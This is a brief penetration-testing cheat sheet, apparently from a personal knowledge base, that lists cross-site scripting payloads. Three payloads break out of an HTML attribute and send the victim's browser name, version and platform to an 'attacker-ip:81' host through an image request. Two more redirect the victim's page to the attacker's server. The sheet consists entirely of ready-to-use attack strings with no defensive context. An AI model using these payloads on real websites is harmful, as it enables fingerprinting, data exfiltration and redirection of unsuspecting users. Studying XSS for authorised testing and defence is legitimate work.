---
id: a0c12c89-8035-4c5f-9245-fa2cb3b5f72b
name: xss payloads
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:36.825009+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# xss payloads

**Command** ([[xss enumeration payloads]]):

```bash
'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.appName;</script>
'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.appVersion;</script>
'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.platform;</script>

```

**Command** ([[xss redirect to own webserver]]):

```bash
'">><script>document.location="http://attacker-ip:81";</script>
'">><script>window.location="http://attacker-ip:81";</script>

```
